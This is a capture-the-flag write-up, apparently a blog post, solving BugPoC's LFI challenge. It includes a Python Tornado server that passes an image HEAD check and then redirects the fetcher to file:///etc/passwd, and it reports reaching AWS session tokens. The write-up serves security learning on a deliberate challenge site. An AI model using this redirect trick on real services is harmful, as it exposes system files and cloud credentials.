---
layout: post
title:  "BugPoC's LFI Challenge Writeup"
date:   2020-10-06 11:25:10 +0545
author: machinexa
image: /posts/writeups/assets/images/lfichallenge.jpeg
category: Writeups
---
<br>

## Description
Browsing Twitter I saw a new challenge from BugPoC which was about LFI I immediately started solving it. The image instructed me to visit [http://social.buggywebsite.com/](https://social.buggywebsite.com/) to start the challenge. Also, since it was a server-sided bug, I got energized to solve it. 

### Starting point
First of I had to find sink where i could execute LFI. I tried typing and it generated the option to share. Looking at the source code more, i find a compressed javascript file, it showed various functinons. After analyzing the code, I found out only request starting with `https` made an xhr request and to https://api.buggywebsite.com. It send json data with url and requestTime parameter.
```js
function processUrl(e) {
    requestTime = Date.now(), url = "https://api.buggywebsite.com/website-preview";
    var t = new XMLHttpRequest;
    t.onreadystatechange = function() {
        4 == t.readyState && 200 == t.status ? (response = JSON.parse(t.responseText), populateWebsitePreview(response)) : 4 == t.readyState && 200 != t.status && (console.log(t.responseText), document.getElementById("website-preview").style.display = "none")
    }, t.open("POST", url, !0), t.setRequestHeader("Content-Type", "application/json; charset=UTF-8"), t.setRequestHeader("Accept", "application/json"), data = {
        url: e,
        requestTime: requestTime
    }, t.send(JSON.stringify(data))
```

### Developing client
I had to write a client that interacts with API with those parameters filled with value. First, i found `get_second()` (a function to get current second) in StackOverflow answer. Then for url, I used input prompt on while loop. This is what a successful response looks like, and it also returns an image in base64 encoded form.   

![Response](/posts/writeups/assets/images/lfichallenge_response.png)

I used the JSON module to parse the data then the content of the image is dumped to file. Here's my source code [Exploit.py](https://gist.github.com/machinexa2/118a7983b407cca55a6a1801a10acb7c); Now, I tried different kinds of stuff, ideas such as SSRF but it wasn't working. I later realized it was using urllib3 to make requests which could never result in LFI but only SSRF. SSRF was also not possible as it was not showing response and was probably blocked. Also, since the API wasn't vulnerable I looked for other endpoints etc but nothing seemed to work. Playing with it for some amount of time revealed something that I missed before.  

### Open Graph metadata
It was parsing the `<meta>` tags and reflecting them. OG is short for Open Graph which allows a web page to become a rich object in the social graph. It had a lot of tags and some tags that were being reflected were `og: description`, `og: type`, `og: image`, and `og.url`. Also, description, type, and url didn't have much effect on the server. However, the parser was again fetching resources from image tag and used urllib3 to fetch. Trying for SSRF again failed me and SSRF wasn't a solution to the challenge so I moved on.

Looking at a different perspective, I found the following details:
* It fetches similar to this `^https://.*\.(jpg|svg|png)$`
* Serving another file with extensions fails a HEAD request, parser checks by mimetype which can be bypassed
* Serving `.jpg` file with jpg or other image magic header, parser base64 encodes image and returns it

![Details](/posts/writeups/assets/images/lfichallenge_details.png)

In above picture, first i editted `index.html` to fetch image and returned response size, then i used .html which gave error **Invalid Image Url**. At last, using `hi.html.jpg` gave error as shown in picture. I tried putting HTML, PHP, and other code in the jpeg mimetype file but it didn't work. I also tried using Exif tags for code execution which didn't work too. I was quite lost at these moments and those weird hints from BugPoC made me madder.  

### Hitting the jackpot
Since, HEAD request was used to verify whether its image or not, I coded in python3 to create a tornado server. I set content-type and other headers of image, and issued redirection by location header to file:///etc/passwd at second get request which should hopefully get us /etc/passwd. A small snippet shows how I coded it:   
```python
class FileHandler(tornado.web.RequestHandler):
    def head(self):
        self.set_header('Content-Length', 237)
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Location', 'http://fa0cf2d0f26e.ngrok.io//asset/original.jpg')
    def get(self):
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Location', 'file:///etc/motd')
        self.write("<p>You should be redirected automatically to target URL: <a href='file:///etc/passwd'>file:///etc/passwd</a>")
        self.redirect("file:///etc/motd")

class IndexHandler(tornado.web.RequestHandler):
    def head(self):
        self.set_header('Content-Length', 237)
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Cache-Control', 'public, max-age=0')
        self.set_header('Pragma', 'no-cache')
        self.redirect('/asset/original.jpg')
    def get(self):
        with open('index.html', 'rb') as f:
            self.write(f.read())
```
<br>
Now, let's host the malicious server, and get that file. Also, I rechanged a lot of my exploit.py code and other files to make it as easy to get the file. I hit the jackpot got the file!

![Pwned](/posts/writeups/assets/images/lfichallenge_pwned.png)

# Changing the impact
This is incomplete writeup and maybe changed. So, some after trying some common files i got two tokens `AWS_SESSION_TOKEN` and `AWS_SECRET_ACCESS_KEY7`. AWS session key was long and covered with lot of slashes. This is the metadata of AWS they talked about. Thats it, I couldnt get any far.

## Takeaway 

* Always try harder, if I left when I failed SSRF, I couldn't have solved the challenge 
* Javascript files are a gold mine. Do always read them and try to find sensitive endpoints.
* Coding is essential to exploit development. Make sure you master at least a single programming language.

Some hints from BugPoC helped me but the last ones were absurd and meaningless. Also, I necessarily didnt have to code server and client. For the server, I could have used BugPoC mock endpoint and for a client, I could have used either burp or browser for testing purposes, the client is best!

